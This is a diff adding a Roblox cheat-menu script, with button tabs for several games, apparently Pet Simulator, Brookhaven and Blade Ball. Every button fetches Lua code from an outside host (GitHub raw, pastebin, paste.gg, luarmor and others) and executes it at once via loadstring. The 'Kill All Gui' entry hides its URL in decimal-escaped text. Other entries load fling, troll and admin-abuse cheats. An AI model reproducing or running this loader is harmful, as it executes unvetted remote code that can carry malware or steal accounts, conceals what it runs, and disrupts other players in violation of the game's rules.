+      	loadstring(game:HttpGet("https://projectevo.xyz/v4/script.lua", true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Catalyst hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/destylol/catalyst/itachi/main.lua'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "HG hub ( key = Hi)",
+	Callback = function()
+      	getgenv().AuthKey="Hi"
+getgenv().LoadSettings={
+    UseSeperateSaves=false,
+    DisableStartupPrompt=false,
+    DisableGamepassCheck=false,
+}
+loadstring(game:HttpGet("https://hugegames.io/psx"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Best hub",
+	Callback = function()
+      	loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
+  	end   
+})
+Tab:AddButton({
+	Name = "THUNDER hub",
+	Callback = function()
+      	loadstring(game:HttpGet"https://raw.githubusercontent.com/RegularThunder/IsCute/main/ScriptLoader")()
+  	end   
+})
+Tab:AddButton({
+	Name = "THUNDER Z hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-05/HUB/main/Script"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Mango hub",
+	Callback = function()
+      	getgenv().WaterMark = true
+loadstring(game:HttpGet("https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Proxo hub",
+	Callback = function()
+      	loadstring(game:HttpGet"https://raw.githubusercontent.com/sinnx32/prx/main/Petsim")()
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Shiny hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/XLinestX/ShinyTool_Key/main/Loader.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Crimson hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/TirSANX/CrimsonHUB/main/C_Loader'))();
+  	end   
+})
+Tab:AddButton({
+	Name = "Simple hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/31"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Ultra hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Ultra-Hub/main/Main"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Meom hub",
+	Callback = function()
+      loadstring(game:HttpGet"https://rawscripts.net/raw/Project-Meow_421")()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Delta hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/1xnnydev/Delta-PSX/main/loader.lua"))()
+  	end   
+})
+local Tab = Window:MakeTab({
+	Name = "Brookhaven",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+      Tab:AddButton({
+        Name = "Jul  hub",
+        Callback = function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-JulHub-New-IceHub-12025"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "REDZ Hub",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Brookhaven gui",
+        Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/fnimPd4C"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Fling Gui",
+        Callback = function()
+loadstring(game:HttpGet('https://pastebin.com/raw/TXMNj1yy'))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Troll Gui",
+        Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Kill All Gui",
+        Callback = function()
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\99\117\114\97\88\48\52\57\47\111\98\102\117\115\99\97\116\101\100\83\99\114\105\112\116\115\47\109\97\105\110\47\75\105\108\108\71\117\105\34\41\41\40\41\10")()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Admin Tools",
+        Callback = function()
+loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
+          end   
+     })
+local Tab = Window:MakeTab({
+	Name = "blade ball",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+Tab:AddButton({
+	Name = "Zygarde hub",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Confused hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/samirayt/Whitelist/main/Whitelist%20Pago"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Combet hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://shz.al/AYJR"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "REDZ hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/redz9999"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Lemon hub",
+	Callback = function()
+     loadstring(game:HttpGet("https://paste.gg/p/anonymous/0425151104df470cb8203508e256b40a/files/aff63dcd12b04bfe8f6d9851eb6b2d3e/raw"))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "DEDOL hub",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/nqxlOfc/Loaders/main/Blade_Ball.lua'))()	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Neva hub",
+	Callback = function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Balli hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/BALLIHUBV2"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Blue hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/kmmwhocare/Crazzy-Hub/main/Blade%20Ball"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Winnable hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Winnablez/Winnable/main/Loader")){}
+  	end   
+})
+Tab:AddButton({
+	Name = "Vector hub",
+	Callback = function()
+     _G.Mode = "English"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/MB*PC.lua"))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "XNOX hub",
+	Callback = function()
+    loadstring(game:HttpGet("https://paste.gg/p/anonymous/42c468c6f0d94d6a86fc90caf7f0e897/files/9d3a059ff4064dc0b9efe621c774d175/raw"))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Ganteng hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://isnahamzahpastebin.tech/bb/gantenghub_01.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Steller hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ImNotFatBitch/LoaderScripts/main/LoaderScripts"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Visual hub",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/DevTravDYT/dsaaswadfeszad/main/Testt'))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "LN hub",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/BladeV4.lua'))();	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Yon hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8555f27454c952fb960ba00a4cd3f8f6.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Red hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()	
+  	end   
+})
+
+
